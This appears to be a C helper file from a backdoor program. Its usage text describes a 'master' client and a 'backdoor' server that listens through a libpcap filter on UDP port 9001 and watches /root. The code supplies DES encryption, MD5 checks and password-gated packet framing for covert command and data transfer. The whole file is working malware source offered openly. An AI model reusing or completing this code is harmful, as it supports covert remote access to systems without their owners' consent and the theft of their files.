#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <openssl/des.h>
#include <openssl/evp.h>

#include "util.h"

void error(const char *err)
{
	fprintf(stderr, "%s\n", err);
	exit(1);
}

void usage(char *name)
{
	//:csdhi:p:f:w:
	printf("Usage: [options] [remote host]%s\n", name);
	printf(" -c Use client mode: Act as master.\n");
	printf(" -s Use server mode: Act as backdoor. [default]\n");
	printf(" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
	printf(" -p <arg> Remote port to use. [default=9001]\n");
	printf(" -f <arg> Libpcap filter to use. [default=udp port 9001]\n");
	printf(" -w <arg> Folder to watch. [default=/root]\n");
	printf(" -h Show this help listing.\n");
	printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -p 80 -d\n", name);
	printf(" EXAMPLES:\t %s -s -d udp port 80\n", name);

  exit(0);
}

uint64 get_sec()
{
	struct timeval curr_time;
	uint64 result;

	gettimeofday(&curr_time, NULL);

	result = ((uint64) curr_time.tv_sec) << 32;
	result += curr_time.tv_usec;

	return result;
}

FILE* open_file(char* fname, uint8 writeMode)
{
	FILE *file;

	if (writeMode)
	{
		if ( (file = fopen(fname, "wb")) == NULL)
			error("Error opening open input file.");
	}
	else
	{
		if ( (file = fopen(fname, "rb")) == NULL)
			error("Error opening open output file.");
	}

	return file;
}

char* encrypt(char *key, char *msg, int size)
{
	static char*    result;
	int             n = 0;
	DES_cblock      key2;
	DES_key_schedule schedule;

	result = (char*)malloc(size);

	// Prepare the key for use with DES_cfb64_encrypt
	memcpy(key2, key, 8);
	DES_set_odd_parity(&key2);
	DES_set_key_checked(&key2, &schedule);

	// Encryption occurs here
	DES_cfb64_encrypt((unsigned char*)msg, (unsigned char*)result, size, &schedule, &key2, &n, DES_ENCRYPT);

	return result;
}

char* decrypt(char *key, char *msg, int size)
{
	static char*    result;
	int             n = 0;
	DES_cblock      key2;
	DES_key_schedule schedule;

	result = (char*)malloc(size);

	// Prepare the key for use with DES_cfb64_encrypt
	memcpy(key2, key, 8);
	DES_set_odd_parity(&key2);
	DES_set_key_checked(&key2, &schedule);

	// Decryption occurs here
	DES_cfb64_encrypt((unsigned char*)msg, (unsigned char*)result, size, &schedule, &key2, &n, DES_DECRYPT);

	return result;
}

void calc_md5(const void *content, ssize_t len, char* md5)
{
  EVP_MD_CTX mdctx;
  unsigned char md_value[EVP_MAX_MD_SIZE];
  unsigned int md_len;

  EVP_DigestInit(&mdctx, EVP_md5());
  EVP_DigestUpdate(&mdctx, content, (size_t) len);
  EVP_DigestFinal_ex(&mdctx, md_value, &md_len);
  EVP_MD_CTX_cleanup(&mdctx);

  for (int i = 0; i < 4; ++i)
  	md5[i] = md_value[i];
}

char* buildTransmission(char *data, int *len, char type)
{
	char *buff;
	char *ptr;
	char md5[MD5_LEN];
	int pass_len;
	int tot_len;
	int data_len;

	pass_len = strlen(HDR_KEY);
	data_len = *len;
	tot_len = data_len + pass_len;

	// Allocate buffer for transmission
	buff = malloc(FRAM_SZ + tot_len);

	// First byte: Command type
	buff[0] = type;

	// Three bytes: Total length
	buff[1] = tot_len >> 16;
	buff[2] = tot_len >> 8;
	buff[3] = tot_len;

	// Copy pass key and data to transmission buffer
	ptr = buff + FRAM_SZ;
	memcpy(ptr, HDR_KEY, pass_len);
	ptr += pass_len;
	memcpy(ptr, data, data_len);

	// Calculate MD5
	ptr = buff + FRAM_SZ;
	calc_md5(ptr, tot_len, md5);
	ptr = buff + 4;
	memcpy(ptr, md5, MD5_LEN);

	// Update len
	*len = tot_len + FRAM_SZ;

	return buff;
}

char* getTransmission(char *packet, int *len, char *type)
{
	char *data;
	char *ptr;
	char md5[MD5_LEN];
	int pass_len;
	int tot_len;
	int data_len;

	pass_len = strlen(HDR_KEY);

	// Check Password
	ptr = packet + FRAM_SZ;
	if (memcmp(ptr, HDR_KEY, pass_len) != 0)
		return NULL;

	// Get Length
	tot_len = (packet[1] << 16) + (packet[2] << 8) + packet[3];
	data_len = tot_len - pass_len;

	// Check MD5
	ptr = packet + FRAM_SZ;
	calc_md5(ptr, tot_len, md5);
	ptr = packet + 4;
	if (memcmp(ptr, md5, MD5_LEN) != 0)
		return NULL;

	// Get TX Type
	*type = packet[0];

	// Get Data
	ptr = packet + FRAM_SZ + pass_len;
	data = malloc(data_len);
	memcpy(data, ptr, data_len);

	// Update len
	*len = data_len;

	return data;
}

